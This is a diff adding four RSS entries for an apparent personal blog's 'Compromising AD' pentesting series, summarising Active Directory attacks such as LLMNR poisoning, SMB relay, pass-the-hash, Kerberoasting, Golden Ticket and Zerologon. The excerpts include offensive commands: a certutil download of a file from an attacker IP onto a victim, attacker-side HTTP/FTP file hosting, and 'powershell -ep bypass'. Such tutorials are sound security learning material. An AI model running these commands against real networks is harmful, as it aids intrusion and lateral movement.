@@ -17,5 +17,52 @@
       <description>Introduction Hey there! Following my recent presentation at the Elastic Community Event, I&amp;rsquo;m thrilled to extend the insights into setting up Elastic for cybersecurity tools. In this blog, we&amp;rsquo;ll take a hands-on approach, providing a detailed guide on leveraging Elasticsearch and its toolkit. Our focus? Building a robust Security Information and Event Management (SIEM) tool, seamlessly incorporating Suricata, Wazuh, Windows Sysmon, network packet capture, and Apache Webserver. All of this orchestrated within the dependable Proxmox stack and Debian server containers.</description>
     </item>
     
+    <item>
+      <title>Compromising AD - Part 4: Post Exploitation</title>
+      <link>https://auti.dev/compromising-ad-part-4-post-exploitation/</link>
+      <pubDate>Tue, 17 Aug 2021 12:35:53 +0530</pubDate>
+      
+      <guid>https://auti.dev/compromising-ad-part-4-post-exploitation/</guid>
+      <description>Post Exploitation Post Exploitation File-Transfers Maintaining-Access Pivoting Setup and Pivot! Cleanup Make the system/network as it was when you entered it. File-Transfers Certutil
+certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt HTTP - Change to the directory you want to host
+python -m SimpleHTTPServer [port] Browser
+Navigate directly to the file (%20 for spaces) FTP
+On Attacker Machine
+python -m pyftpdlib 21 On Victim Machine, Browse to
+ftp 10.10.10.10 Linux
+wget https://example.com/example.txt Maintaining-Access Add a user</description>
+    </item>
+    
+    <item>
+      <title>Compromising AD - Part 3: Post Compromise Attacks</title>
+      <link>https://auti.dev/compromising-ad-part-3-post-compromise-attacks/</link>
+      <pubDate>Mon, 16 Aug 2021 12:35:53 +0530</pubDate>
+      
+      <guid>https://auti.dev/compromising-ad-part-3-post-compromise-attacks/</guid>
+      <description>Post-Compromise Attacks Post-Compromise Attacks passthehash ??? WTF Mitigations Token-Impersonation What are tokens? Two types Setup Mitigations Kerberoasting Kerberoast? Mitigations GPP-cPassword-Attacks Group Policy Preferences Attack aka MS14-025 Resources Setup Exploiting &amp;ldquo;Active&amp;rdquo; Machine on HacktheBox Privesc that Machine! Mitigations URL-File-Attacks SCF and URL file attack against writeable share Mitigations Print-Nightmare Resources Exploit Mitigation - just disable the damn service! Installation Exploit Mimikatz What&amp;rsquo;s that? Resources Exploit Golden-Ticket-Attack What is a Golden Ticket? Exploit Mitigations Zero-Logon aka CVE-2020-1472 Resources Exploit Mitigations Next &amp;gt;&amp;gt; Part 4: Post Exploitation passthehash If we crack a password and/or dump the SAM Hashes, we can leverage both for lateral movement in networks!</description>
+    </item>
+    
+    <item>
+      <title>Compromising AD - Part 2: Post Compromise Enumeration</title>
+      <link>https://auti.dev/compromising-ad-part-2-post-compromise-enumeration/</link>
+      <pubDate>Sun, 15 Aug 2021 12:37:53 +0530</pubDate>
+      
+      <guid>https://auti.dev/compromising-ad-part-2-post-compromise-enumeration/</guid>
+      <description>Post Compromise Enumeration Post Compromise Enumeration Powerview Requirements Enumeration Bloodhound Setup Enumeration Next &amp;gt;&amp;gt; Part 3: Post Compromise Attacks Powerview Requirements https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView
+Enumeration Load up a command prompt and cd into Downloads
+powershell -ep bypass	-ep is ExecutionPolicy (Stops us from executing scripts) bypass - bypass :) Load PowerView
+. .\Powerview.ps1 Fundamental Commands
+Get-NetDomain //Returns information about the domain Get-NetDomainController // Returns Information about DC Get-DomainPolicy // Returns Domain Policies such as Kerberos Policy, System Access, Version, Registry Values (Get-DomainPolicy).</description>
+    </item>
+    
+    <item>
+      <title>Compromising AD - Part 1: Initial Attack Vectors</title>
+      <link>https://auti.dev/compromising-ad-part-1-initial-attack-vectors/</link>
+      <pubDate>Sun, 15 Aug 2021 12:35:53 +0530</pubDate>
+      
+      <guid>https://auti.dev/compromising-ad-part-1-initial-attack-vectors/</guid>
+      <description>Initial Attack Vectors Initial Attack Vectors - Reference Article: - Install Impacket Tools LLMNR-Poisoning - LMNR: Link Local Multicast Name Resolution (Used to Identify hosts when DNS fails) Defense Against LLMNR Poisoning SMB-Relay-Attacks What is SMB Relay? Requirements Setup Defense Against SMB Relay IPv6-Attacks Resources Requirements Setup Defense Against IPv6 Attacks Passback-Attacks Introducing the Pass-Back Attack Accessing the EWS Replace LDAP Attributes Capture Credentials Attacking SMTP and Windows Sign-in Resources Strategies Reference Article https://adam-toscher.</description>
+    </item>
+    
   </channel>
 </rss>
